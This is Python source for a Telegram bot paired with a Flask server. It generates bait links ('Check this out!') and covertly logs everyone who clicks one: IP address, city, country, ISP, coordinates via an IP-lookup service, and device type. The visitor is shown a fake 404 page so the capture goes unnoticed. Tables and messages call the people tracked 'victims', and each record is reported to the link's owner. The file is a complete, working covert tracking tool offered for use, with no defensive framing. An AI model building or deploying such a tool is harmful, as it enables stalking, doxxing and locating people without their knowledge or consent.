import os
import sqlite3
import json
import requests
import random
import string
import threading
from datetime import datetime
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

# ============= CONFIGURATION =============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
PORT = int(os.environ.get("PORT", 10000))
RENDER_URL = os.environ.get("RENDER_URL", "https://your-app.onrender.com")

# ============= DATABASE SETUP =============
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  first_name TEXT,
                  joined_date TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (link_id TEXT PRIMARY KEY,
                  owner_id INTEGER,
                  link_code TEXT,
                  created_date TEXT,
                  clicks INTEGER DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS victim_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  victim_ip TEXT,
                  victim_location TEXT,
                  victim_city TEXT,
                  victim_country TEXT,
                  victim_isp TEXT,
                  device_info TEXT,
                  timestamp TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_history
                 (user_id INTEGER,
                  link_id TEXT,
                  victim_info TEXT,
                  timestamp TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

# ============= TELEGRAM BOT HANDLERS =============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)",
              (user.id, user.username, user.first_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    await show_main_menu(update, context, user.id)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    keyboard = [
        [InlineKeyboardButton("🔗 Create New Link", callback_data="create_link")],
        [InlineKeyboardButton("📋 My Links", callback_data="my_links")],
        [InlineKeyboardButton("📊 My History", callback_data="my_history")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    msg = "🎯 *Main Menu*\n\nCreate tracking links and monitor activity.\n\nWhen someone clicks your link, you'll get:\n📍 Exact Location\n🌐 IP Address & ISP\n📱 Device Information"
    
    if update.callback_query:
        await update.callback_query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    else:
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == "create_link":
        await create_link(update, context, user_id)
    elif query.data == "my_links":
        await show_my_links(update, context, user_id)
    elif query.data == "my_history":
        await show_my_history(update, context, user_id)
    elif query.data.startswith("view_link_"):
        link_id = query.data.replace("view_link_", "")
        await show_link_stats(update, context, link_id, user_id)
    elif query.data == "back_menu":
        await show_main_menu(update, context, user_id)

async def create_link(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    public_url = RENDER_URL
    
    link_code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    link_id = f"track_{link_code}"
    
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("INSERT INTO links (link_id, owner_id, link_code, created_date) VALUES (?, ?, ?, ?)",
              (link_id, user_id, link_code, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tracking_url = f"{public_url}/track/{link_id}"
    
    keyboard = [
        [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={tracking_url}&text=🎁 Check this out!")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    msg = f"✅ *Link Created Successfully!*\n\n"
    msg += f"🔗 Your tracking link:\n`{tracking_url}`\n\n"
    msg += f"📊 *What happens when someone clicks:*\n"
    msg += f"• Captures IP Address\n"
    msg += f"• Gets exact location\n"
    msg += f"• Shows ISP & Device Info\n"
    msg += f"• Victim sees 404 error page\n\n"
    msg += f"⚠️ Use responsibly!"
    
    await update.callback_query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def show_my_links(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT link_id, link_code, created_date, clicks FROM links WHERE owner_id = ? ORDER BY created_date DESC", (user_id,))
    links = c.fetchall()
    conn.close()
    
    if not links:
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_menu")]]
        await update.callback_query.edit_message_text("📭 You haven't created any links yet.", reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    keyboard = []
    for link in links:
        link_id, link_code, created, clicks = link
        keyboard.append([InlineKeyboardButton(f"🔗 {link_code} ({clicks} clicks)", callback_data=f"view_link_{link_id}")])
    keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
    
    await update.callback_query.edit_message_text("📋 *Your Links*\n\nTap any link to see details:", 
                                                   parse_mode=ParseMode.MARKDOWN,
                                                   reply_markup=InlineKeyboardMarkup(keyboard))

async def show_link_stats(update: Update, context: ContextTypes.DEFAULT_TYPE, link_id: str, user_id: int):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT link_code, created_date, clicks FROM links WHERE link_id = ? AND owner_id = ?", (link_id, user_id))
    link = c.fetchone()
    
    if not link:
        await update.callback_query.edit_message_text("Link not found.")
        return
    
    c.execute("""SELECT victim_ip, victim_city, victim_country, victim_isp, device_info, timestamp 
                 FROM victim_data WHERE link_id = ? ORDER BY timestamp DESC LIMIT 10""", (link_id,))
    victims = c.fetchall()
    conn.close()
    
    link_code, created, clicks = link
    
    msg = f"📊 *Link Statistics*\n\n"
    msg += f"🔗 Code: `{link_code}`\n"
    msg += f"📅 Created: {created[:19]}\n"
    msg += f"👆 Total Clicks: {clicks}\n\n"
    
    if victims:
        msg += "*📌 Recent Victims:*\n"
        for i, victim in enumerate(victims[:10], 1):
            ip, city, country, isp, device, timestamp = victim
            msg += f"\n*{i}. 🌐 IP:* `{ip}`\n"
            msg += f"   📍 *Location:* {city}, {country}\n"
            msg += f"   🏢 *ISP:* {isp}\n"
            msg += f"   📱 *Device:* {device}\n"
            msg += f"   🕒 *Time:* {timestamp[:19]}\n"
            msg += f"   {'─' * 30}\n"
    else:
        msg += "📭 No clicks yet. Share your link!\n"
    
    keyboard = [[InlineKeyboardButton("🔙 Back to My Links", callback_data="my_links")]]
    await update.callback_query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def show_my_history(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("""SELECT h.link_id, h.victim_info, h.timestamp, l.link_code 
                 FROM user_history h 
                 JOIN links l ON h.link_id = l.link_id 
                 WHERE h.user_id = ? 
                 ORDER BY h.timestamp DESC LIMIT 20""", (user_id,))
    history = c.fetchall()
    conn.close()
    
    if not history:
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_menu")]]
        await update.callback_query.edit_message_text("📭 No activity history yet.", reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    msg = "📜 *Your Activity History (Last 20)*\n\n"
    for i, item in enumerate(history[:20], 1):
        link_id, victim_info, timestamp, link_code = item
        try:
            info = json.loads(victim_info)
            city = info.get('city', 'Unknown')
            country = info.get('country', 'Unknown')
            ip = info.get('ip', 'Unknown')
            msg += f"{i}. *{link_code}*\n"
            msg += f"   📍 {city}, {country}\n"
            msg += f"   🌐 `{ip}`\n"
            msg += f"   🕒 {timestamp[:19]}\n\n"
        except:
            msg += f"{i}. *{link_code}* - {timestamp[:19]}\n\n"
        
        if len(msg) > 3500:
            msg += "\n... and more"
            break
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
    await update.callback_query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

# ============= FLASK SERVER =============
app = Flask(__name__)

@app.route('/track/<link_id>', methods=['GET'])
def track_user(link_id):
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Get location
    location_data = {}
    try:
        ip_response = requests.get(f'http://ip-api.com/json/{victim_ip}', timeout=5)
        ip_data = ip_response.json()
        
        if ip_data.get('status') == 'success':
            location_data = {
                'city': ip_data.get('city', 'Unknown'),
                'country': ip_data.get('country', 'Unknown'),
                'lat': ip_data.get('lat', 0),
                'lon': ip_data.get('lon', 0),
                'isp': ip_data.get('isp', 'Unknown'),
            }
            location_str = f"{location_data['city']}, {location_data['country']}"
        else:
            location_str = "Unknown"
            location_data = {'city': 'Unknown', 'country': 'Unknown', 'isp': 'Unknown'}
    except:
        location_str = "Unknown"
        location_data = {'city': 'Unknown', 'country': 'Unknown', 'isp': 'Unknown'}
    
    # Device info
    device_info = "Unknown"
    if 'Android' in user_agent:
        device_info = "Android"
    elif 'iPhone' in user_agent:
        device_info = "iOS"
    elif 'Windows' in user_agent:
        device_info = "Windows PC"
    elif 'Mac' in user_agent:
        device_info = "Mac"
    
    # Save to database
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id = ?", (link_id,))
    c.execute("SELECT owner_id FROM links WHERE link_id = ?", (link_id,))
    owner = c.fetchone()
    
    c.execute("""INSERT INTO victim_data 
                 (link_id, victim_ip, victim_location, victim_city, victim_country, victim_isp, device_info, timestamp) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
              (link_id, victim_ip, location_str, location_data.get('city', 'Unknown'), 
               location_data.get('country', 'Unknown'), location_data.get('isp', 'Unknown'), 
               device_info, datetime.now().isoformat()))
    
    if owner:
        victim_info_json = json.dumps({
            'ip': victim_ip,
            'location': location_str,
            'city': location_data.get('city', 'Unknown'),
            'country': location_data.get('country', 'Unknown'),
            'isp': location_data.get('isp', 'Unknown'),
            'device': device_info,
        })
        c.execute("INSERT INTO user_history (user_id, link_id, victim_info, timestamp) VALUES (?, ?, ?, ?)",
                  (owner[0], link_id, victim_info_json, datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    
    print(f"🎯 Victim: {victim_ip} | {location_str} | {device_info}")
    
    # Return 404 error page
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 - Page Not Found</title>
        <style>
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                font-family: Arial, sans-serif;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                margin: 0;
            }
            .container {
                text-align: center;
                background: white;
                border-radius: 20px;
                padding: 50px;
                max-width: 500px;
            }
            h1 { font-size: 100px; margin: 0; color: #667eea; }
            p { color: #666; }
            a {
                display: inline-block;
                background: #667eea;
                color: white;
                padding: 12px 30px;
                border-radius: 30px;
                text-decoration: none;
                margin-top: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>404</h1>
            <h2>Page Not Found</h2>
            <p>The page you are looking for doesn't exist or has been moved.</p>
            <a href="https://www.google.com">Go to Homepage</a>
        </div>
    </body>
    </html>
    ''', 404

@app.route('/')
def home():
    return "Bot is running!", 200

# ============= MAIN =============
def main():
    # Run Flask in background thread
    def run_flask():
        app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Run bot with polling
    application = Application.builder().token(BOT_TOKEN).build()
    application.bot_data['public_url'] = RENDER_URL
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_callback))
    
    print("🤖 Bot started with polling mode!")
    print(f"📱 Public URL: {RENDER_URL}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
